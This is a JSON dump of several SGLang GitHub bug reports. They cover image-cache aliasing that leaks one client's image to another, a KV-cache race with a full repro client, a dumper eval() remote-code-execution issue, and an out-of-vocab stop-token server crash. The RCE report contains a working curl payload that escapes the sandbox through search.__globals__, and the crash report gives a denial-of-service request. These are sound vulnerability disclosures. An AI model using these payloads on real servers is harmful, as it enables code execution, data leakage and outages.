j[\"text\"], j[\"meta_info\"][\"cached_tokens\"]\n\nprint(gen(\"A.png\", \"deadbeef00000001\"))  # \"IMAGE-A-SECRET-7f3a9c ...\", cached_tokens 15\nprint(gen(\"B.png\", \"aaaa0000bbbb0002\"))  # \"IMAGE-B-DISTRACT-2c1b4d ...\", cached_tokens 15\nprint(gen(\"B.png\", \"deadbeef00000001\"))  # \"IMAGE-A-SECRET-7f3a9c ...\", cached_tokens 193\n```\n\nThe third request sends image B but transcribes `IMAGE-A-SECRET-7f3a9c`, the content of the image cached under the declared hash. Swapping the roles (cache B first, then send A with the same hash) returns B's content the same way. Reproduced on 3/3 cold restarts.\n\nThe radix cache is shared across clients, so the aliasing is not limited to one connection: in a two-host check, a second client sending a plain gray image with the same declared hash received the first client's image content in the response (`cached_tokens` 190).\n\n### Environment\n\nSGLang at commit `b8a6adadfe8c292fbb673291dbd2a5d23232f500`, unmodified\nModel: Qwen2.5-VL-3B-Instruct, single RTX 4090\nLaunch: `python -m sglang.launch_server --model-path <model> --host 0.0.0.0 --port 8200 --disable-cuda-graph -attention-backend triton --mm-attention-backend triton_attn`\nLinux, Python 3.10","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44641/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/44641/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44070","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/44070/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/44070/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/44070/events","html_url":"https://github.com/sgl-project/sglang/issues/44070","id":5831479043,"node_id":"I_kwDOLCAjRs8AAAABW5VPAw","number":44070,"title":"[Bug] PD prefill: early cached-prefix send can transfer KV before the HiCache load-back finishes (stale KV on decode)","user":{"login":"mattteochen","id":74564987,"node_id":"MDQ6VXNlcjc0NTY0OTg3","avatar_url":"https://avatars.githubusercontent.com/u/74564987?v=4","gravatar_id":"","url":"https://api.github.com/users/mattteochen","html_url":"https://github.com/mattteochen","followers_url":"https://api.github.com/users/mattteochen/followers","following_url":"https://api.github.com/users/mattteochen/following{/other_user}","gists_url":"https://api.github.com/users/mattteochen/gists{/gist_id}","starred_url":"https://api.github.com/users/mattteochen/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/mattteochen/subscriptions","organizations_url":"https://api.github.com/users/mattteochen/orgs","repos_url":"https://api.github.com/users/mattteochen/repos","events_url":"https://api.github.com/users/mattteochen/events{/privacy}","received_events_url":"https://api.github.com/users/mattteochen/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":4,"created_at":"2026-10-13T13:46:28Z","updated_at":"2026-10-15T22:00:44Z","closed_at":null,"assignee":null,"author_association":"CONTRIBUTOR","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### Describe the bug\n\nOn a PD **prefill** server with HiCache and the default early cached-prefix send (`SGLANG_DISAGG_PREFILL_EARLY_SEND_CACHED_PREFIX=1`), decode can **silently receive stale KV** for part of a prefix.\n\nThe trigger is two requests sharing a prefix whose KV is only in host memory, admitted in the **same prefill batch**:\n1. The first request queues the HiCache load-back. `commit_load_back` attaches the new device pages to the radix node right away, while the H2D copy is only queued ([unified_radix_cache.py](https://github.com/sgl-project/sglang/blob/7ff3a112846a3fcc12a27bba09d644885a226e4d/python/sglang/srt/mem_cache/unified_radix_cache.py#L1800-L1823)).\n2. The second request is re-matched onto those pages as device prefix (`host_hit_length = 0`).\n3. `maybe_send_cached_prefix_chunk` sends them before the forward, while the H2D is still writing them ([prefill.py](https://github.com/sgl-project/sglang/blob/7ff3a112846a3fcc12a27bba09d644885a226e4d/python/sglang/srt/disaggregation/prefill.py#L1415-L1450)). The range is never re-sent.\n\nResults (GB300, 1P1D, NIXL, Qwen3-4B-Instruct-2507, two identical 100K-token prompts sent together):\n\n| Image | HiCache I/O | Corrupted trials |\n|---|---|---|\n| 2026-09-14 SGLang nightly image | `direct` | 39/40 |\n| 2026-09-14 SGLang nightly image | `kernel` | 29/30 |\n| 2026-09-23 SGLang nightly image, `--disaggregation-enable-kv-checksum` | `direct` | 29/30, every one flagged `KV checksum mismatch` |\n\n- With early send disabled: 0/84.\n- With the second request sent after the first finished: 0/18.\n- Answers change when the needed context lies in the reloaded range.\n- `main` has the same code path but was not run.\n\n**Workaround:** `SGLANG_DISAGG_PREFILL_EARLY_SEND_CACHED_PREFIX=0`.\n\n**Possible fix:** skip the early send when the batch queued a load-back (`batch.hicache_consumer_index >= 0`), or make the KV transfer wait on the load-back's finish event.\n\n### Reproduction\n\n2026-09-23 SGLang nightly image (`lmsysorg/sglang:nightly-dev-20260923-06008c17`), one node, two GPUs.\n\n```bash\n# prefill (GPU0): small device pool so prefixes get evicted to host\npython3 -m sglang.launch_server --model-path Qwen/Qwen3-4B-Instruct-2507 --page-size 64 \\\n  --context-length 131072 --disaggregation-mode prefill --disaggregation-transfer-backend nixl \\\n  --port 30000 --disaggregation-bootstrap-port 8998 --base-gpu-id 0 \\\n  --chunked-prefill-size 16384 --max-total-tokens 172800 --mem-fraction-static 0.5 \\\n  --enable-hierarchical-cache --hicache-write-policy write_back --hicache-io-backend direct --hicache-size 80 \\\n  --disaggregation-enable-kv-checksum\n\n# decode (GPU1)\npython3 -m sglang.launch_server --model-path Qwen/Qwen3-4B-Instruct-2507 --page-size 64 \\\n  --context-length 131072 --disaggregation-mode decode --disaggregation-transfer-backend nixl \\\n  --port 30001 --base-gpu-id 1 --mem-fraction-static 0.7 --max-running-requests 32 \\\n  --disaggregation-enable-kv-checksum\n\n# client (below): 20 trials of two concurrent identical requests on a host-only 100K prefix\npython3 n1_client.py --prefill http://127.0.0.1:30000 --decode http://127.0.0.1:30001 \\\n  --bootstrap-host <prefill IP> --model Qwen/Qwen3-4B-Instruct-2507 --tag n1 --out n1.jsonl --plan concurrent:20\n```\n\n**Expected:**\n- **With the bug:** in most trials one of the two concurrent requests fails with HTTP 500 `KV checksum mismatch`.\n- **Without it:** `--plan sequential:10`, or `SGLANG_DISAGG_PREFILL_EARLY_SEND_CACHED_PREFIX=0` on the prefill server, gives 0 mismatches.\n\n<details>\n<summary><code>n1_client.py</code> (router-free PD client; needs <code>requests</code> and <code>transformers</code>)</summary>\n\n```python\n#!/usr/bin/env python3\n\"\"\"Repro client for the early-send vs HiCache load-back race (router-free PD dispatch:\nthe same payload with bootstrap_host/port/room goes to the prefill and the decode server).\n\nTwo needle-in-a-haystack prompts X0, X1 (~100K tokens each), greedy decoding. The prefill\ndevice pool holds about one prompt plus a blocker, so X0 and X1 alternate between device\nand host (HiCache write_back).\n  setup   W0 = X0 fresh, W1 = X1 fresh (evicts X0 to host), PRIME = X0 (loads X0 back,\n          evicts X1 to host).\n  trial i target X = X[(i+1) % 2] (host-only)\n          B = 12K random tokens (one forward); U and T queue up during B and are admitted\n              together in the build that starts X's load-back;\n          U, T = X sent together (--mode concurrent) or T after U finishes (sequential);\n          R = X again (device hit), which keeps X most recently used.\nOne JSON line per trial; prints U/T answers per trial.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport argparse\nimport json\nimport random\nimport sys\nimport threading\nimport time\n\nimport requests\n\nCOLORS = \"amber azure crimson golden indigo ivory jade magenta olive scarlet silver teal violet copper cobalt\".split()\nANIMALS = \"falcon otter panther heron walrus badger lynx marmot gecko condor bison ferret jackal osprey\".split()\nADJ = (\"quiet busy ancient modern small large bright dark gentle rapid steady curious distant local \"\n       \"northern southern careful sudden warm cold narrow broad simple complex\").split()\nNOUN = (\"river village market engineer farmer teacher bridge library garden harbor mountain station \"\n        \"museum orchard workshop festival committee report journey forest valley canal tower lantern\").split()\nVERB = (\"visits describes repairs studies follows crosses paints measures records builds watches \"\n        \"explains opens closes improves supports\").split()\nPLACE = (\"near the old mill\", \"beside the canal\", \"after the storm\", \"before dawn\", \"in early spring\",\n         \"during the long winter\", \"at the edge of town\", \"under the clock tower\", \"along the coast\")\nQUESTION = (\"Question: What is the secret code given in this document? \"\n            \"Reply with only the code.\")\n\n\ndef haystack_text(rng: random.Random, n_sentences: int) -> str:\n    return \" \".join(\n        f\"The {rng.choice(ADJ)} {rng.choice(NOUN)} {rng.choice(VERB)} the {rng.choice(ADJ)} \"\n        f\"{rng.choice(NOUN)} {rng.choice(PLACE)}.\" for _ in range(n_sentences))\n\n\nclass PD:\n    def __init__(self, prefill: str, decode: str, bhost: str, bport: int, timeout: float):\n        self.prefill, self.decode, self.bhost, self.bport, self.timeout = prefill, decode, bhost, bport, timeout\n\n    def generate(self, rid: str, ids: list[int], max_new: int) -> dict:\n        room = random.getrandbits(62)\n        payload = {\n            \"input_ids\": ids,\n            \"sampling_params\": {\"temperature\": 0.0, \"max_new_tokens\": max_new, \"skip_special_tokens\": True},\n            \"rid\": rid, \"bootstrap_host\": self.bhost, \"bootstrap_port\": self.bport,\n            \"bootstrap_room\": room, \"stream\": False,\n        }\n        res: dict = {\"rid\": rid, \"room\": room, \"n_in\": len(ids), \"t_send\": time.time()}\n        err: list = []\n\n        def _p():\n            try:\n                r = requests.post(self.prefill + \"/generate\", json=payload, timeout=self.timeout)\n                res[\"prefill_status\"] = r.status_code\n            except Exception as e:  # noqa: BLE001\n                err.append(f\"prefill: {e!r}\")\n\n        th = threading.Thread(target=_p)\n        th.start()\n        try:\n            r = requests.post(self.decode + \"/generate\", json=payload, timeout=self.timeout)\n            res[\"decode_status\"] = r.status_code\n            j = r.json()\n            if isinstance(j, dict):\n                res[\"text\"] = j.get(\"text\")\n                res[\"output_ids\"] = j.get(\"output_ids\")\n                mi = j.get(\"meta_info\", {}) or {}\n                res[\"finish_reason\"] = mi.get(\"finish_reason\")\n            if r.status_code != 200:\n                res[\"body\"] = str(j)[:800]\n        except Exception as e:  # noqa: BLE001\n            err.append(f\"decode: {e!r}\")\n        th.join()\n        res[\"t_done\"] = time.time()\n        if err:\n            res[\"error\"] = err\n        return res\n\n\ndef main():\n    ap = argparse.ArgumentParser()\n    ap.add_argument(\"--prefill\", required=True)\n    ap.add_argument(\"--decode\", required=True)\n    ap.add_argument(\"--bootstrap-host\", required=True)\n    ap.add_argument(\"--bootstrap-port\", type=int, default=8998)\n    ap.add_argument(\"--model\", required=True)\n    ap.add_argument(\"--tag\", required=True)\n    ap.add_argument(\"--out\", required=True)\n    ap.add_argument(\"--plan\", default=\"concurrent:20\", help=\"comma list of mode:trials, run in order\")\n    ap.add_argument(\"--plen\", type=int, default=100_000)\n    ap.add_argument(\"--blocker-len\", type=int, default=12_000)\n    ap.add_argument(\"--ut-delay-ms\", type=float, default=20.0)\n    ap.add_argument(\"--max-new\", type=int, default=24)\n    ap.add_argument(\"--seed\", type=int, default=1234)\n    ap.add_argument(\"--timeout\", type=float, default=900.0)\n    ap.add_argument(\"--deadline\", type=float, default=0.0, help=\"unix time after which no new trial starts\")\n    ap.add_argument(\"--dry-run\", action=\"store_true\", help=\"build the prompts, print their shape, exit\")\n    ap.add_argument(\"--needle-frac\", type=float, default=0.0,\n                    help=\"0 = code sentence at the start; f > 0 = code sentence at ~f * plen tokens\")\n    a = ap.parse_args()\n\n    from transformers import AutoTokenizer\n\n    tok = AutoTokenizer.from_pretrained(a.model)\n    tmpl = tok.apply_chat_template([{\"role\": \"user\", \"content\": \"<<SPLIT>>\"}], tokenize=False,\n                                   add_generation_prompt=True)\n    pre_s, post_s = tmpl.split(\"<<SPLIT>>\")\n    pd = PD(a.prefill, a.decode, a.bootstrap_host, a.bootstrap_port, a.timeout)\n    vocab_hi = min(len(tok) - 1000, 150_000)\n    norm = lambda s: (s or \"\").strip().upper().replace(\" \", \"\")  # noqa: E731\n\n    def make_prompt(k):\n        rng = random.Random(a.seed * 100 + k)\n        code = f\"{rng.choice(COLORS).upper()}-{rng.choice(ANIMALS).upper()}-{rng.randint(1000, 9999)}\"\n        needle = f\"Remember this secret code: {code}. You will be asked about it at the end.\\n\\n\"\n        if a.needle_frac > 0:\n            head = tok.encode(pre_s, add_special_tokens=False)\n            mid = tok.encode(\" \" + needle, add_special_tokens=False)\n        else:\n            head = tok.encode(pre_s + needle, add_special_tokens=False)\n            mid = []\n        tail = tok.encode(\"\\n\\n\" + QUESTION + post_s, add_special_tokens=False)\n        need = a.plen - len(head) - len(mid) - len(tail)\n        hay = tok.encode(haystack_text(rng, need // 12 + 200), add_special_tokens=False)\n        while len(hay) < need:\n            hay += tok.encode(\" \" + haystack_text(rng, 500), add_special_tokens=False)\n        hay = hay[:need]\n        cut = max(0, int(a.plen * a.needle_frac) - len(head))\n        return head + hay[:cut] + mid + hay[cut:] + tail, code\n\n    X = [make_prompt(0), make_prompt(1)]\n    if a.dry_run:\n        for k, (ids, code) in enumerate(X):\n            needle_at = next((j for j in range(len(ids) - 8) if \"secret code\" in tok.decode(ids[j:j + 6])), None)\n            print(f\"prompt {k}: len={len(ids)} code={code} pages_cached={len(ids) // 64} needle_at_token={needle_at} \"\n                  f\"head={tok.decode(ids[:40])!r} tail={tok.decode(ids[-40:])!r}\")\n        return 0\n    brng = random.Random(a.seed + 7)\n    fo = open(a.out, \"a\")\n\n    def emit(rec):\n        fo.write(json.dumps(rec) + \"\\n\")\n        fo.flush()\n\n    # ---------------- setup ----------------\n    setup = {\"tag\": a.tag, \"kind\": \"setup\", \"codes\": [X[0][1], X[1][1]], \"n_prompt\": [len(X[0][0]), len(X[1][0])]}\n    for k in (0, 1):\n        setup[f\"W{k}\"] = pd.generate(f\"{a.tag}-W{k}\", X[k][0], a.max_new)\n        setup[f\"W{k}_ok\"] = X[k][1].replace(\" \", \"\") in norm(setup[f\"W{k}\"].get(\"text\"))\n    setup[\"PRIME\"] = pd.generate(f\"{a.tag}-PRIME\", X[0][0], a.max_new)\n    setup[\"PRIME_ok\"] = X[0][1] in norm(setup[\"PRIME\"].get(\"text\"))\n    emit(setup)\n    print(f\"[client] setup W0={setup['W0'].get('text')!r} ok={setup['W0_ok']} W1={setup['W1'].get('text')!r} \"\n          f\"ok={setup['W1_ok']} PRIME={setup['PRIME'].get('text')!r} ok={setup['PRIME_ok']}\", flush=True)\n    ref_ids = {0: setup[\"W0\"].get(\"output_ids\"), 1: setup[\"W1\"].get(\"output_ids\")}\n\n    # ---------------- trials ----------------\n    i = 0\n    for item in a.plan.split(\",\"):\n        mode, n = item.split(\":\")\n        for _ in range(int(n)):\n            if a.deadline and time.time() > a.deadline:\n                print(f\"[client] deadline reached before trial {i}\", flush=True)\n                fo.close()\n                return 0\n            k = (i + 1) % 2\n            ids, code = X[k]\n            base = f\"{a.tag}-t{i:02d}\"\n            rec = {\"tag\": a.tag, \"kind\": \"trial\", \"trial\": i, \"mode\": mode, \"target\": k, \"code\": code}\n            out: dict = {}\n\n            def run(key, rid, toks, nnew):\n                out[key] = pd.generate(rid, toks, nnew)\n\n            t0 = time.time()\n            blocker = [brng.randint(1000, vocab_hi) for _ in range(a.blocker_len)]\n            thB = threading.Thread(target=run, args=(\"B\", f\"{base}-B\", blocker, 1))\n            thB.start()\n            time.sleep(a.ut_delay_ms / 1000.0)\n            thU = threading.Thread(target=run, args=(\"U\", f\"{base}-U\", ids, a.max_new))\n            thT = threading.Thread(target=run, args=(\"T\", f\"{base}-T\", ids, a.max_new))\n            if mode == \"concurrent\":\n                thU.start(); thT.start(); thU.join(); thT.join(); thB.join()  # noqa: E702\n            else:\n                thU.start(); thU.join(); thB.join(); thT.start(); thT.join()  # noqa: E702\n            run(\"R\", f\"{base}-R\", ids, a.max_new)\n            rec.update(out)\n            for kk in (\"U\", \"T\", \"R\"):\n                rec[f\"{kk}_ok\"] = code.replace(\" \", \"\") in norm(rec[kk].get(\"text\"))\n                rec[f\"{kk}_eq_W\"] = rec[kk].get(\"output_ids\") == ref_ids[k]\n            rec[\"UT_same\"] = rec[\"U\"].get(\"output_ids\") == rec[\"T\"].get(\"output_ids\")\n            rec[\"trial_s\"] = time.time() - t0\n            emit(rec)\n            errs = {kk: rec[kk].get(\"error\") or rec[kk].get(\"body\") for kk in (\"B\", \"U\", \"T\", \"R\") if\n                    rec[kk].get(\"error\") or rec[kk].get(\"body\")}\n            print(f\"[client] {base} {mode} X{k} U_ok={rec['U_ok']} T_ok={rec['T_ok']} R_ok={rec['R_ok']} \"\n                  f\"UT_same={rec['UT_same']} U={rec['U'].get('text')!r} T={rec['T'].get('text')!r} \"\n                  f\"errs={errs} ({rec['trial_s']:.1f}s)\", flush=True)\n            i += 1\n    fo.close()\n    return 0\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n```\n\n</details>\n\n### Environment\n\n2026-09-23 SGLang nightly image (`sglang 0.0.0.dev1+g06008c170`, `torch 2.13.0+cu130`, `nixl 1.4.1`), NVIDIA GB300.\n","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44070/reactions","total_count":1,"+1":1,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/44070/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44188","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/44188/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/44188/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/44188/events","html_url":"https://github.com/sgl-project/sglang/issues/44188","id":5841975991,"node_id":"I_kwDOLCAjRs8AAAABXDV6tw","number":44188,"title":"[Bug] Dumper filter eval() enables scheduler-process RCE","user":{"login":"JPengLi","id":78134872,"node_id":"MDQ6VXNlcjc4MTM0ODcy","avatar_url":"https://avatars.githubusercontent.com/u/78134872?v=4","gravatar_id":"","url":"https://api.github.com/users/JPengLi","html_url":"https://github.com/JPengLi","followers_url":"https://api.github.com/users/JPengLi/followers","following_url":"https://api.github.com/users/JPengLi/following{/other_user}","gists_url":"https://api.github.com/users/JPengLi/gists{/gist_id}","starred_url":"https://api.github.com/users/JPengLi/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/JPengLi/subscriptions","organizations_url":"https://api.github.com/users/JPengLi/orgs","repos_url":"https://api.github.com/users/JPengLi/repos","events_url":"https://api.github.com/users/JPengLi/events{/privacy}","received_events_url":"https://api.github.com/users/JPengLi/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":1,"created_at":"2026-10-14T04:32:22Z","updated_at":"2026-10-15T19:34:59Z","closed_at":null,"assignee":null,"author_association":"NONE","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### Checklist\n\n- [x] I searched related issues but found no solution.\n- [x] The bug persists in the latest version.\n- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.\n- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.\n- [x] Please use English. Otherwise, it will be closed.\n\n### Describe the bug\n\nWhen the server runs with `DUMPER_SERVER_PORT=reuse`, `/dumper/{method}` is registered on the main model API and marked `ADMIN_OPTIONAL`. `/dumper/configure` passes the JSON body directly into the dumper configuration, including the string field `filter`.\n\nDuring model execution, `_evaluate_filter` evaluates that string with Python `eval`:\n\n```python\n# python/sglang/srt/debug_utils/dumper.py:1312-1320\ndef _evaluate_filter(filter_expr: str, tags: dict[str, Any]) -> bool:\n    namespace = _DefaultNoneDict(tags)\n    namespace.update(_FILTER_BUILTINS)\n    return bool(eval(filter_expr, {\"__builtins__\": {}}, namespace))\n```\n\nAlthough `__builtins__` is removed, `_FILTER_BUILTINS` exposes the function objects `re.search` and `re.match`. A Python function object has a `__globals__` attribute, which leads back to the module globals and the real builtins mapping. An attacker can therefore use `__import__` from `search.__globals__` and execute arbitrary Python code in the scheduler process.\n\n### Reproduction\n\nLaunch an isolated server with the dumper control route enabled and with only an ordinary API key:\n\n```bash\nDUMPER_SERVER_PORT=reuse \\\npython3 -m sglang.launch_server \\\n  --model-path /models/Qwen2.5-0.5B-Instruct \\\n  --host 127.0.0.1 \\\n  --port 30200 \\\n  --api-key user-secret\n```\n\nConfirm that the authorization boundary distinguishes credentials:\n\n```bash\ncurl -i -X POST http://127.0.0.1:30200/dumper/get_state \\\n  -H 'Authorization: Bearer wrong-secret' \\\n  -H 'Content-Type: application/json' -d '{}'\n```\n\nObserved:\n\n```text\nHTTP/1.1 401 Unauthorized\n```\n\nUsing the ordinary API key succeeds:\n\n```bash\ncurl -i -X POST http://127.0.0.1:30200/dumper/get_state \\\n  -H 'Authorization: Bearer user-secret' \\\n  -H 'Content-Type: application/json' -d '{}'\n```\n\nObserved:\n\n```text\nHTTP/1.1 200 OK\n```\n\nConfigure a harmless marker-writing payload. It imports `pathlib` through the exposed function object, writes one file, and evaluates to False so no tensor dump is saved:\n\n```bash\ncurl -sS -X POST http://127.0.0.1:30200/dumper/configure \\\n  -H 'Authorization: Bearer user-secret' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"enable\": true,\n    \"filter\": \"(search.__globals__['__builtins__']['__import__']('pathlib').Path('/tmp/sglang-dumper-marker').write_text('SGLANG_DUMPER_RCE') > 0) and False\"\n  }'\n```\n\nTrigger one model forward:\n\n```bash\ncurl -sS -X POST http://127.0.0.1:30200/generate \\\n  -H 'Authorization: Bearer user-secret' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"text\": \"trigger\",\n    \"sampling_params\": {\"max_new_tokens\": 1, \"temperature\": 0}\n  }'\n```\n\nObserved:\n\n```text\nHTTP/1.1 200 OK\n```\n\nThe scheduler process then created:\n\n```text\n/tmp/sglang-dumper-marker\n```\n\nwith content:\n\n```text\nSGLANG_DUMPER_RCE\n```\n\nThe configured filter can be reset with:\n\n```bash\ncurl -sS -X POST http://127.0.0.1:30200/dumper/reset \\\n  -H 'Authorization: Bearer user-secret' \\\n  -H 'Content-Type: application/json' -d '{}'\n```\n\n### Evidence\n\nSource on commit `51686cf8e7fee0ae773c5c9b8ede356507abef7b`:\n\n```python\n# python/sglang/srt/entrypoints/http_server.py:886-887\n@app.api_route(\"/dumper/{method}\", methods=[\"POST\"])\n@auth_level(AuthLevel.ADMIN_OPTIONAL)\n```\n\n```python\n# python/sglang/srt/debug_utils/dumper.py:1307-1308\n_FILTER_BUILTINS: dict[str, Any] = {\"search\": re.search, \"match\": re.match}\n```\n\n```python\nreturn bool(eval(filter_expr, {\"__builtins__\": {}}, namespace))\n```\n\nDynamic v0.5.19 observations:\n\n```text\nwrong bearer key /dumper/get_state   -> HTTP 401\nordinary key /dumper/get_state       -> HTTP 200\nordinary key /dumper/configure       -> HTTP 200\nordinary key /generate               -> HTTP 200\n/tmp/sglang-dumper-marker            -> created by scheduler\n```\n\nMarker SHA-256 from the collected evidence:\n\n```text\nc045148ae95f16d70bf7666b6c1289a0b98bb0b4d9ea55f441b7da06a4fd94ea\n```\n\nAn earlier run used a host-only path that did not exist inside the container. Its traceback still showed the same execution escaping to `pathlib.Path.write_text()`; the failure was only `FileNotFoundError` for that incorrect marker path. The corrected container path reproduced successfully without a crash.\n\n### Impact\n\n\nIf `DUMPER_SERVER_PORT=reuse` is enabled and `admin_api_key` is absent, an ordinary API-key holder can execute arbitrary Python code in the scheduler process. With no API key configured, the same route is reachable without authentication.\n\n- **Confidentiality: High.** Arbitrary code can read model files, mounted credentials, environment variables, process memory, and other data accessible to the scheduler.\n- **Integrity: High.** Arbitrary code can modify files, runtime state, model state, or configuration and can establish persistence with the scheduler's permissions.\n- **Availability: High.** Arbitrary code can terminate or crash the scheduler, corrupt runtime state, or exhaust CPU, GPU, memory, disk, or network resources.\n\nPossible consequences include reading model files and environment secrets, modifying model state or files, opening network connections, terminating workers, or pivoting with the scheduler process's permissions. The empty-builtins argument is not a security sandbox because callable objects retain references to their defining globals.\n\nPrerequisites:\n\n- `DUMPER_SERVER_PORT=reuse`;\n- access to `/dumper/configure` and `/generate`;\n- no `admin_api_key`, or possession of the admin key;\n- a subsequent model execution that reaches a dumper hook.\n\nThe filter should not be evaluated with `eval`. A structured parser or a restricted expression evaluator without function objects is needed. If arbitrary expressions are intentionally required for debugging, the route should require forced admin authentication, be disabled by default, and ideally be restricted to development builds.\n\n### Environment\n\n```\n$ docker exec sglang-v0519-prefill-134 python3 -m sglang.check_env\nPython: 3.12.3 (main, Jul 15 2026, 23:46:41) [GCC 13.3.0]\nCUDA available: True\nGPU 0: NVIDIA A100 80GB PCIe\nGPU 0 Compute Capability: 8.0\nCUDA_HOME: /usr/local/cuda\nNVCC: Cuda compilation tools, release 13.0, V13.0.88\nCUDA Driver Version: 590.48.01\nPyTorch: 2.13.0+cu130\nsglang: 0.5.19\nsglang-kernel: 0.4.6.post1\nflashinfer_python: 0.6.18\nflashinfer_cubin: 0.6.18\nflashinfer_jit_cache: 0.6.18+cu130\ntriton: 3.7.1\ntransformers: 5.12.1\nnumpy: 2.3.5\naiohttp: 3.14.3\nfastapi: 0.141.1\nhuggingface_hub: 1.30.0\nmodelscope: 1.39.1\norjson: 3.12.0\npydantic: 2.13.5\npython-multipart: 0.0.32\nuvicorn: 0.52.4\nuvloop: 0.22.1\ntorchcodec: 0.15.0+cu130\nulimit soft: 1024\n```","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44188/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/44188/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44535","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/44535/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/44535/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/44535/events","html_url":"https://github.com/sgl-project/sglang/issues/44535","id":5871235550,"node_id":"I_kwDOLCAjRs8AAAABXfPx3g","number":44535,"title":"[Bug] Out-of-vocab `stop_token_ids` crash the server in the min_new_tokens penalizer","user":{"login":"KrishnanPrash","id":140860868,"node_id":"U_kgDOCGVdxA","avatar_url":"https://avatars.githubusercontent.com/u/140860868?v=4","gravatar_id":"","url":"https://api.github.com/users/KrishnanPrash","html_url":"https://github.com/KrishnanPrash","followers_url":"https://api.github.com/users/KrishnanPrash/followers","following_url":"https://api.github.com/users/KrishnanPrash/following{/other_user}","gists_url":"https://api.github.com/users/KrishnanPrash/gists{/gist_id}","starred_url":"https://api.github.com/users/KrishnanPrash/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/KrishnanPrash/subscriptions","organizations_url":"https://api.github.com/users/KrishnanPrash/orgs","repos_url":"https://api.github.com/users/KrishnanPrash/repos","events_url":"https://api.github.com/users/KrishnanPrash/events{/privacy}","received_events_url":"https://api.github.com/users/KrishnanPrash/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":0,"created_at":"2026-10-15T17:53:34Z","updated_at":"2026-10-15T17:53:34Z","closed_at":null,"assignee":null,"author_association":"CONTRIBUTOR","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### Checklist\n\n- [x] I searched related issues but found no solution.\n- [x] The bug persists in the latest version.\n- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.\n- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.\n- [x] Please use English. Otherwise, it will be closed.\n\n### Describe the bug\n\nA `stop_token_ids` entry above `vocab_size` (or negative) kills the server when any request in the batch has `min_new_tokens > 0`. All in-flight requests fail.\n\n`SamplingParams.verify()` checks `logit_bias` keys against `vocab_size`, but not `stop_token_ids`. `BatchedMinNewTokensPenalizer._prepare` (`penaltylib/min_new_tokens.py:65`) scatters the stop ids of every request in the batch into a `[batch, vocab_size + 1]` CUDA tensor. An out-of-range id triggers a device-side assert.\n\nItem 2 of #31597 reported this. That issue was auto-closed for inactivity. The fix PR #31561 was auto-closed by the idle-PR limit before any maintainer review. The bug is still present on v0.5.21 and on main (b67785153a).\n\nExpected: HTTP 400 for a stop id outside `[0, vocab_size)`, as `verify()` already does for `logit_bias`.\n\n### Reproduction\n\n```bash\npython -m sglang.launch_server --model-path Qwen/Qwen3-0.6B --port 30000\n```\n\nCase 1: one request.\n\n```bash\ncurl -s localhost:30000/generate -H 'Content-Type: application/json' \\\n  -d '{\"text\":\"Hi\",\"sampling_params\":{\"max_new_tokens\":4,\"min_new_tokens\":1,\"stop_token_ids\":[1000000]}}'\n```\n\nCase 2: the bad request has no `min_new_tokens`. It joins a batch with a valid request that has it.\n\n```bash\ncurl -s localhost:30000/generate -H 'Content-Type: application/json' \\\n  -d 